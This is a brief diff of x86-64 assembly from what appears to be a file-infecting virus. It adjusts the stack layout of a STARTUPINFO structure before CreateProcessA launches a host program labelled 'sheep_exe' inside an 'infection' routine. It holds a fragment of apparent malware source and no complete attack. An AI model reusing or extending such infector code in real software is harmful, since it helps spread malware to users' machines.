@@ -77,20 +77,20 @@ infection__payload_exists:
    xor r9d,r9d
    xorps xmm0,xmm0
    movups [rsp+0x28],xmm0
-   movups [rsp+0x38],xmm0
-   lea rax, [rsp+0x78]
+   mov [rsp+0x38],rcx
+   lea rax, [rsp+0x70]
+   mov [rsp+0x40], rax
+   lea rax, [rsp+0x50]
    mov [rsp+0x48], rax
-   lea rax, [rsp+0x58]
-   mov [rsp+0x50], rax
-   movups [rsp+0x58],xmm0
-   movups [rsp+0x68],xmm0
-   mov dword [rsp+0x78], 0x68
-   movups [rsp+0x7c],xmm0
-   movups [rsp+0x8c],xmm0
-   movups [rsp+0x9c],xmm0
-   movups [rsp+0xac],xmm0
-   movups [rsp+0xbc],xmm0
-   movups [rsp+0xcc],xmm0
+   movups [rsp+0x50],xmm0
+   movups [rsp+0x60],xmm0
+   mov dword [rsp+0x70], 0x68
+   movups [rsp+0x74],xmm0
+   movups [rsp+0x84],xmm0
+   movups [rsp+0x94],xmm0
+   movups [rsp+0xa4],xmm0
+   movups [rsp+0xb4],xmm0
+   movups [rsp+0xc4],xmm0
    call rbp                     ; CreateProcessA(NULL, sheep_exe, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
 infection__end:
